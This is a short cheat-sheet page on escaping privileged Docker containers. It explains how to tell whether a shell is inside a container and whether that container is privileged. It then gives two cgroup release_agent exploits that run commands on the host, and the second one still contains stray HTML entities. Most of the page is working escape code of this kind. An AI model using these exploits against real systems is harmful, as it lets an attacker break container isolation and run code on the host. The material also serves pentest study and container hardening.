# Docker escape

dockers which running with '--privileged' or '--cap-add=SYS\_ADMIN ' parameters could be exploited to gain access to the underline system from the docker container.

### How can you tell if you’re in a container? <a id="8eb6"></a>

cgroups stands for “control groups.” It is a Linux feature that isolates resource usage and is what Docker uses to isolate containers. You can tell if you are in a container by checking the init process’ control group at `/proc/1/cgroup`. If you are not located inside a container, the control group should be `/`. On the other hand, if you are inside a container, you should see `/docker/CONTAINER_ID` instead.

### How can you tell if a container is privileged? <a id="e81f"></a>

Once you’ve determined that you are in a container, you need to determine if that container is privileged. The best way to do this is to run a command that requires the `--privileged` flag and see if it succeeds.

For example, you can try to add a dummy interface by using an `iproute2` command. This command requires the `NET_ADMIN` capability, which the container would have if it is privileged:

```text
$ ip link add dummy0 type dummy
```

If this command runs successfully, you can conclude that the container has the `NET_ADMIN` capability. `NET_ADMIN` is part of the privileged capabilities set, and containers that don’t have it are not privileged. You can clean up the `dummy0` link after this test by running this command:

```text
ip link delete dummy0
```

### Exploit \#1

```text
# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### Exploit \#2

```text
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c &gt;$d/release_agent;printf '#!/bin/sh\nps &gt;'&quot;$t/o&quot; &gt;/c;
chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;sleep 1;cat /o
```

### source:

[https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1](https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1)

